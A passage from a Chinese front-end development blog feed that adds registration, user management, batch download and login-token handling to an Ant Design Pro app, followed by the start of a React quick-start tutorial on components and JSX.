class="property">body</span>;</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">waitTime</span>(<span class="number">2000</span>);</span><br><span class="line">  <span class="comment">// 这里可以添加更多的注册逻辑，如检查用户名是否已存在等</span></span><br><span class="line">  <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(&#123; <span class="attr">status</span>: <span class="string">&#x27;ok&#x27;</span>, <span class="attr">currentAuthority</span>: <span class="string">&#x27;user&#x27;</span>, <span class="attr">success</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(&#123; <span class="attr">status</span>: <span class="string">&#x27;error&#x27;</span>, <span class="attr">message</span>: <span class="string">&#x27;注册失败&#x27;</span>, <span class="attr">success</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>去 <code>src\services\ant-design-pro\api.ts</code> 文件下添加对应的API接口</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 注册接口 POST /api/register */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">register</span>(<span class="params">body: API.RegisterParams, options?: &#123; [key: <span class="built_in">string</span>]: <span class="built_in">any</span> &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> request&lt;<span class="variable constant_">API</span>.<span class="property">RegisterResult</span>&gt;(<span class="string">&#x27;/api/register&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">data</span>: body,</span><br><span class="line">    ...(options || &#123;&#125;),</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>src\services\ant-design-pro\typings.d.ts</code> 文件下定义数据类型 <code>API.RegisterResult</code> 和 <code>API.RegisterParams</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">RegisterParams</span> = &#123;</span><br><span class="line">  username?: <span class="built_in">string</span>;</span><br><span class="line">  password?: <span class="built_in">string</span>;</span><br><span class="line">  email?: <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">RegisterResult</span> = &#123;</span><br><span class="line">  status?: <span class="built_in">string</span>;</span><br><span class="line">  currentAuthority?: <span class="built_in">string</span>;</span><br><span class="line">  success?: <span class="built_in">boolean</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来就是编写注册组件页面 <code>src\pages\User\Register\index.tsx</code>，这里不贴代码了，可以直接看仓库源码</p><p>最后再把页面绑定到登录页面 <code>src\pages\User\Login\index.tsx</code> 上，找到下面的代码</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;a</span><br><span class="line">  style=&#123;&#123;</span><br><span class="line">    <span class="attr">float</span>: <span class="string">&#x27;right&#x27;</span>,</span><br><span class="line">  &#125;&#125;</span><br><span class="line">&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">FormattedMessage</span> <span class="attr">id</span>=<span class="string">&quot;pages.login.forgotPassword&quot;</span> <span class="attr">defaultMessage</span>=<span class="string">&quot;忘记密码&quot;</span> /&gt;</span></span></span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>注释掉后换成</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;a</span><br><span class="line">  style=&#123;&#123;</span><br><span class="line">    <span class="attr">float</span>: <span class="string">&#x27;right&#x27;</span>,</span><br><span class="line">  &#125;&#125;</span><br><span class="line">  onClick=&#123;<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    history.<span class="title function_">push</span>(<span class="string">&#x27;/user/register&#x27;</span>);</span><br><span class="line">  &#125;&#125;</span><br><span class="line">&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">FormattedMessage</span> <span class="attr">id</span>=<span class="string">&quot;pages.login.register&quot;</span> <span class="attr">defaultMessage</span>=<span class="string">&quot;注册&quot;</span> /&gt;</span></span></span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>完成注册界面的编写</p><h2 id="用户管理页面"><a class="markdownIt-Anchor" href="#用户管理页面"></a> 用户管理页面</h2><p>添加用户管理页面，设置了用户的增删改查功能，设置username为主键，不可修改username</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240801171000518.png" alt="image-20240801171000518" /></p><p>弹窗修改和新增用户</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240801171031979.png" alt="image-20240801171031979" /></p><p>这里就不贴代码了，直接去仓库看源码吧。可以仔细学习下这个页面怎么开发，大部分的管理页面都可以基于这个页面来进行修改</p><h2 id="下载功能页面"><a class="markdownIt-Anchor" href="#下载功能页面"></a> 下载功能页面</h2><p>在编写的时候，出现了一些问题：</p><ul><li><p><strong>单个下载、批量下载和全选下载</strong>：</p><ul><li><p>一般情况下，设计单个下载和批量下载两个接口即可。单个下载直接将下载的文件id发送给对应的api/download，批量下载将所有需要下载的文件id列表发送给api/download/batch</p></li><li><p>但是因为我们的数据库数据量比较大，所以需要<strong>分页查询</strong>，即点击新的页面会发送新的请求，请求数据包中包含page、pagesize等参数。这样的话全选下载就会存在一些问题，在前端页面中，我们点击第二页的时候才会向服务器请求第二页的数据。如果我们在第一页直接选择全选下载，我们只向后端请求了第一页的数据，是获取不到第二页及后面所有的页面的id的，这样就不能用批量下载来进行全选下载了。</p></li><li><p>因此，在这里我们设计三个api来分别实现单个下载、批量下载和全选下载</p></li></ul></li><li><p>如果我在第一页选中了一些行，点击第二页的时候，如果在第二页页选中了一些行，当我又选中一些行后，点击批量下载，第一页选中的行并没有下载</p><blockquote><p>为了解决这个问题，我们需要在前端保存所有选中的行，无论它们在哪一页。我们可以使用一个状态来跟踪所有选中的行，而不仅仅是当前页的选中行。然后，<strong>我们在批量下载时使用这个全局的选中行状态</strong>。</p></blockquote></li><li><p>使用上面的方法后，<u>发送给API的参数列表中包含了之前选中的行</u>。但是，在前端页面中，如果我在第一页选中了一些行，点击第二页的时候，如果在第二页页选中了一些行，再点击第一页的时候，<strong>之前选中的行前面的勾选框没有被勾选</strong>（虽然点击批量下载按钮后这些行的数据发送给了API）</p><blockquote><p>这是因为在切换页面时，表格组件的 <code>selectedRowKeys</code> 状态没有被持久化并重新应用到表格中。当切换回第一页时，<code>selectedRowKeys</code> 的状态丢失了。我们需要确保在每次加载数据后，表格组件的 <code>selectedRowKeys</code> 与 <code>allSelectedRows</code> 同步。</p></blockquote></li><li><p><strong>已经勾选了的行并不能取消勾选</strong></p><blockquote><p>为了解决已勾选的行无法取消勾选的问题，我们需要确保在取消勾选时，<code>allSelectedRows</code>状态能正确更新。我们需要在<code>handleSelectChange</code>函数中增加逻辑，以便在取消勾选时移除相应的行。</p></blockquote></li></ul><h2 id="连接实际api"><a class="markdownIt-Anchor" href="#连接实际api"></a> 连接实际API</h2><p>连接后端API，发现产生了报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240726143246075.png" alt="image-20240726143246075" /></p><p>这是因为默认不允许浏览器跨域，需要在服务端设置CORS。</p><p>为了方便，我们可以也先设置浏览器使其允许跨域，参考：<a href="https://blog.csdn.net/weixin_48594833/article/details/124345191">Chrome浏览器的跨域设置</a></p><p>使用跨域浏览器打开，成功获取到数据</p><h2 id="添加token机制"><a class="markdownIt-Anchor" href="#添加token机制"></a> 添加token机制</h2><p><code>src\requestErrorConfig.ts</code> 文件中有请求拦截器</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求拦截器</span></span><br><span class="line"><span class="attr">requestInterceptors</span>: [</span><br><span class="line">  <span class="function">(<span class="params">config: RequestOptions</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 拦截请求配置，进行个性化处理。</span></span><br><span class="line">    <span class="keyword">const</span> url = config?.<span class="property">url</span>?.<span class="title function_">concat</span>(<span class="string">&#x27;?token = 123&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> &#123; ...config, url &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>这段代码的作用在于给每一个API请求都加上参数token=123，而在实际部署和上线的环境中，硬编码的 <code>token=123</code> 是不合理的，因为这样会暴露敏感信息并且无法应对动态变化的认证需求。正确的做法应该是使用动态获取和安全存储的方式来处理 token。</p><p>在这里，我们设置通过登录获取 Token 并在请求中使用</p><ul><li><strong>实现用户登录功能，从服务器获取 Token</strong>。</li><li><strong>将 Token 存储在客户端（例如 localStorage 或 cookies 中）</strong>。</li><li><strong>在每个请求中从存储中获取 Token 并附加到请求中</strong>。</li></ul><ol><li><p><strong>首先我们修改登录的api函数</strong></p><p><code>src\services\ant-design-pro\api.ts</code>  中的登录api函数可以不修改，但是我们需要修改一下对应的数据类型，打开 <code>src\services\ant-design-pro\typings.d.ts</code> 进行修改</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">LoginParams</span> = &#123;</span><br><span class="line">  username?: <span class="built_in">string</span>;</span><br><span class="line">  password?: <span class="built_in">string</span>;</span><br><span class="line">  autoLogin?: <span class="built_in">boolean</span>;</span><br><span class="line">  <span class="keyword">type</span>?: <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">type</span> <span class="title class_">LoginResult</span> = &#123;</span><br><span class="line">  status?: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">type</span>?: <span class="built_in">string</span>;</span><br><span class="line">  currentAuthority?: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">token</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>修改请求函数文件，使得登录的时候从服务器中获取token</strong></p><p>修改 <code>src\pages\User\Login\index.tsx</code> 文件，在 <code>handleSubmit</code> 函数中，获取 Token 并将其存储在 localStorage 中。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加获取token</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleSubmit</span> = <span class="keyword">async</span> (<span class="params">values: API.LoginParams</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> msg = <span class="keyword">await</span> <span class="title function_">login</span>(&#123; ...values, <span class="keyword">type</span> &#125;);</span><br><span class="line">    <span class="keyword">if</span> (msg.<span class="property">status</span> === <span class="string">&#x27;ok&#x27;</span> &amp;&amp; msg.<span class="property">token</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> defaultLoginSuccessMessage = intl.<span class="title function_">formatMessage</span>(&#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="string">&#x27;pages.login.success&#x27;</span>,</span><br><span class="line">        <span class="attr">defaultMessage</span>: <span class="string">&#x27;登录成功！&#x27;</span>,</span><br><span class="line">      &#125;);</span><br><span class="line">      message.<span class="title function_">success</span>(defaultLoginSuccessMessage);</span><br><span class="line">      <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;authToken&#x27;</span>, msg.<span class="property">token</span>);  <span class="comment">// 存储 token</span></span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">fetchUserInfo</span>();</span><br><span class="line">      <span class="keyword">const</span> urlParams = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>).<span class="property">searchParams</span>;</span><br><span class="line">      history.<span class="title function_">push</span>(urlParams.<span class="title function_">get</span>(<span class="string">&#x27;redirect&#x27;</span>) || <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">setUserLoginState</span>(msg);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="keyword">const</span> defaultLoginFailureMessage = intl.<span class="title function_">formatMessage</span>(&#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">&#x27;pages.login.failure&#x27;</span>,</span><br><span class="line">      <span class="attr">defaultMessage</span>: <span class="string">&#x27;登录失败，请重试！&#x27;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    message.<span class="title function_">error</span>(defaultLoginFailureMessage);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>在请求中附加 Token</strong></p><p>在 <code>src/requestErrorConfig.ts</code> 中的请求拦截器中附加 Token，使得后续每一次请求的时候，都从 localStorage 中提取出来token，放置到请求头的Authorization字段中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">requestInterceptors: [</span><br><span class="line">  (config: RequestOptions) =&gt; &#123;</span><br><span class="line">    const token = localStorage.getItem(&#x27;authToken&#x27;);</span><br><span class="line">    if (token) &#123;</span><br><span class="line">      config.headers = &#123;</span><br><span class="line">        ...config.headers,</span><br><span class="line">        Authorization: `Bearer $&#123;token&#125;`,</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    return config;</span><br><span class="line">  &#125;,</span><br><span class="line">],</span><br></pre></td></tr></table></figure><blockquote><p>antd 源代码中硬编码token且作为参数传递，正式部署上线一般都是将token放在请求头中的Authorization字段</p></blockquote></li><li><p><strong>修改mock模拟服务端返回token</strong></p><p>这里对 <code>mock\user.ts</code> 文件进行修改。antd源代码方法是从环境变量中读取用户权限，指的是通过读取环境变量 <code>MY_CUSTOM_ENV_VARIABLE</code> 来设置当前用户的权限</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">MY_CUSTOM_ENV_VARIABLE</span> &#125; = process.<span class="property">env</span>;</span><br><span class="line"><span class="keyword">let</span> access = <span class="variable constant_">MY_CUSTOM_ENV_VARIABLE</span> === <span class="string">&#x27;site&#x27;</span> ? <span class="string">&#x27;admin&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>我们将access定义为前面设置的三种权限，并新定义生成token和验证token的方法，分别在login和currentUser的api下执行。</p><p>这里写的比较粗糙，并没有应用动态的token，就不贴例子了，可以直接去代码中看</p></li><li><p><strong>修改退出登录api</strong></p><p>既然登录后获取到了api并且存储在 localStorage 中，在我们退出登录的时候就需要清除用户会话或 token</p><ul><li><p><strong>服务端</strong>：确保在用户退出时使其Token无效。</p></li><li><p><strong>客户端</strong>：确保客户端在退出登录时删除本地存储的Token。</p><p>注意，antd源代码中硬编码token，所以退出登录中并没有使用到token，这里的逻辑其实是点击就直接返回success，这个退出登录其实完全没有退出</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240801155538805.png" alt="image-20240801155538805" /></p><p>点击退出登录后，客户端并没有删除掉本地存储的Token，虽然重定向到了登录页面，但我们其实可以不需要再次登录，就可以访问原本登录的用户有权限访问的页面。</p><p>我们尝试一下，登录amin后退出登录，不再次登录直接访问页面 <code>http://localhost:8000/search/logindata</code>，可以看到加载出了页面，随便输入一个domain进行查询</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240801163221506.png" alt="image-20240801163221506" /></p><p>可以看到可以直接访问，请求头中包含token，因此我们需要在点击退出登录后删除掉本地存储的token</p><p>修改 <code>src\components\RightContent\AvatarDropdown.tsx</code> 文件中的 <code>loginOut</code> 函数，这个函数的功能是描述了点击退出登录后，调用退出登录的api并进行的操作，我们修改后加上删除本地存储的token</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">loginOut</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">outLogin</span>();</span><br><span class="line">      <span class="comment">// 删除本地存储的Token</span></span><br><span class="line">      <span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&#x27;authToken&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> &#123; search, pathname &#125; = <span class="variable language_">window</span>.<span class="property">location</span>;</span><br><span class="line">      <span class="keyword">const</span> urlParams = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>).<span class="property">searchParams</span>;</span><br><span class="line">      <span class="keyword">const</span> redirect = urlParams.<span class="title function_">get</span>(<span class="string">&#x27;redirect&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">pathname</span> !== <span class="string">&#x27;/user/login&#x27;</span> &amp;&amp; !redirect) &#123;</span><br><span class="line">        history.<span class="title function_">replace</span>(&#123;</span><br><span class="line">          <span class="attr">pathname</span>: <span class="string">&#x27;/user/login&#x27;</span>,</span><br><span class="line">          <span class="attr">search</span>: <span class="title function_">stringify</span>(&#123;</span><br><span class="line">            <span class="attr">redirect</span>: pathname + search,</span><br><span class="line">          &#125;),</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Logout failed:&#x27;</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>现在我们再次尝试登录，退出登录后直接访问后面的页面 <code>http://localhost:8000/search/logindata</code>，可以看到请求直接被拦截，因为请求头中不再包含token，验证无法通过</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240801163846493.png" alt="image-20240801163846493" /></p><p>到这里我们前端的token功能添加就完成了！</p><blockquote><p>在退出登录的请求中，通常只需要在请求头中包含Token即可，参数可以省略。这样可以确保Token在服务器端被正确识别和处理以使其失效。</p></blockquote></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> web前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web前端开发 </tag>
            
            <tag> Ant Design </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『web前端开发』React快速入门</title>
      <link href="/posts/64ed.html"/>
      <url>/posts/64ed.html</url>
      
        <content type="html"><![CDATA[<p>项目需要开发一个web平台，已有 HTML + CSS + JavaScript 的一定基础</p><p>本文主要是快速入门react的笔记，仅了解核心的概念和语法，足够后续更改开源项目即可。学习过程主要参考下面的视频和官方文档</p><ul><li><a href="https://www.bilibili.com/video/BV1pF411m7wV">30分钟学会React18核心语法 可能是你学会React最好的机会 前端开发必会框架 无废话精品视频</a></li><li><a href="https://zh-hans.react.dev/">React 官方中文文档</a></li></ul><h1 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h1><ol><li><p><strong>react是什么</strong></p><p>我们平常想要在Web网站上展示数据的时候，需要</p><p>（1）发送请求获取数据</p><p>（2）处理数据（过滤、整理格式等）</p><p>（3）操作DOM呈现页面</p><p>在我们操作DOM呈现页面的时候，通常需要DOM-API来操作UI，繁琐、效率低</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;span&#x27;</span>)</span><br></pre></td></tr></table></figure><p>react就是帮助我们进行（3），可以更加方便的操作DOM，<strong>将数据渲染为HTML视图</strong></p></li><li><p><strong>react的作用</strong></p><p>原生 JavaScript 的缺点</p><ul><li>原生JavaScript通过<u>DOM-API</u>操作DOM，繁琐且效率低</li><li>使用JavaScript直接操作DOM，浏览器会进行大量的<u>重绘重排</u>。</li><li>原生JavaScript没有<u>组件化编码方案</u>，代码复用率低。</li></ul><p>react：</p><ul><li>组件化模式、声明式编码，提高开发效率及组件复用率</li><li>react native可以通过react语法进行移动端开发</li><li><strong>使用虚拟DOM和Diffing算法，尽量减少与真实DOM的交互，防止了重绘重排</strong>，实现视图的高效更新</li></ul><blockquote><p>虚拟DOM的理解：</p><p><a href="https://www.bilibili.com/video/BV1wy4y1D7JT">尚硅谷React教程</a>  16:45-25:26</p></blockquote></li><li><p><strong>jsx</strong></p><p>react中定义的一种JavaScript 的扩展语法（即react独有的模版语法），将HTML标签和JS代码混合使用。</p><p>例如：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> element = <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">className</span>=<span class="string">&quot;foo&quot;</span>&gt;</span>Hello, world<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line"><span class="keyword">const</span> root = <span class="title class_">ReactDOM</span>.<span class="title function_">createRoot</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;root&quot;</span>));</span><br><span class="line">root.<span class="title function_">render</span>(element);</span><br></pre></td></tr></table></figure></li><li><p><strong>状态</strong></p><p>状态是组件中用于存储和控制数据的对象，当状态发生变化时，组件会重新渲染以反映新的状态。这使得React组件可以动态地响应用户交互和其他事件。</p><blockquote><p>即产生了数据的更新、交互</p></blockquote></li></ol><h1 id="jsx基本语法"><a class="markdownIt-Anchor" href="#jsx基本语法"></a> jsx基本语法</h1><ol><li><p><strong>组件</strong></p><p><strong>1）定义</strong></p><p>React 应用程序是由 <strong>组件</strong> 组成的。一个组件是 UI（用户界面）的一部分，它拥有自己的逻辑和外观。组件可以小到一个按钮，也可以大到整个页面。</p><p><strong>React 组件在形式上表现为：返回标签的 JavaScript 函数</strong></p><ul><li>React 组件必须<strong>以大写字母开头</strong></li><li>React 组件都是以<strong>函数形式</strong>表示的</li></ul><p><strong>2）示例</strong></p><p>自定义 MyButton 组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function MyButton() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;button&gt;I&#x27;m a button&lt;/button&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所定义的组件可以嵌套到其他的组件，注意这个应用方法 <code>&lt;MyButton /&gt;</code> ，进行了<strong>自闭和</strong></p><blockquote><p>JSX 比 HTML 更加严格，必须闭合标签，如 <code>&lt;br /&gt;</code>。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">export default function MyApp() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;Welcome to my app&lt;/h1&gt;</span><br><span class="line">      &lt;MyButton /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>父组件</strong>：这里可以认为 <code>MyApp</code> 是一个 <strong>父组件</strong>，将每个 <code>MyButton</code> 渲染为一个“孩子”。这是 React 的神奇之处：你可以只定义组件一次，然后按需多处和多次使用。</li></ul><p><strong>3）注意事项</strong></p><ul><li>不能嵌套组件的定义，即在一个组件中不能直接定义另一个组件</li><li>当子组件需要使用父组件的数据时，你需要 <a href="https://zh-hans.react.dev/learn/passing-props-to-a-component">通过 props 的形式进行传递</a></li></ul></li><li><p><strong>每一个组件只能一个根元素</strong></p><p><strong>1）原因</strong></p><ul><li>不管是vue还是react，模板都将被编译为render函数，而函数的返回值只能是一个，所以如果不用单独的根节点包住，就会并列返回多个返回值，这在js中是不允许的。</li><li>除了这一点，还有一个主要是原因是，react和vue都将把模板的内容转换为对应的元素，最后建立起虚拟dom树，而树状结构只能有唯一的根节点，这样在后续的虚拟dom数据有变化时，可以检查到具体更改的位置。如果有多个根节点，则不能明确到底要在哪个树上查找更新。</li></ul><p><strong>2）如何返回多个元素？使用Fragment将它们包裹到一个共享的父级中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function App()&#123;</span><br><span class="line">  const list = [</span><br><span class="line">    &#123;id : 1, name : &#x27;a&#x27;&#125;,</span><br><span class="line">    &#123;id : 2, name : &#x27;b&#x27;&#125;, </span><br><span class="line">    &#123;id : 3, name : &#x27;c&#x27;&#125;</span><br><span class="line">  ]</span><br><span class="line">  </span><br><span class="line">  // 像这样在组件中并列返回多个根元素是不可行的</span><br><span class="line">  // const listConent = list.map(item =&gt; (</span><br><span class="line">  //   &lt;li key = &#123;item.id&#125;&gt;&#123;item.name&#125;&lt;/li&gt;</span><br><span class="line">  //   &lt;li&gt;----------------------&lt;/li&gt;</span><br><span class="line">  // ))</span><br><span class="line">  </span><br><span class="line">  const listConent = list.map(item =&gt; (</span><br><span class="line">    &lt;Fragment key = &#123;item.id&#125;&gt;</span><br><span class="line">      &lt;li key = &#123;item.id&#125;&gt;&#123;item.name&#125;&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;----------------------&lt;/li&gt;</span><br><span class="line">    &lt;/Fragment&gt;</span><br><span class="line">  ))</span><br><span class="line">  </span><br><span class="line">  return(</span><br><span class="line">    &lt;ul&gt;&#123;listConent&#125;&lt;/ul&gt;</span><br><span class="line">  )</span><br><span 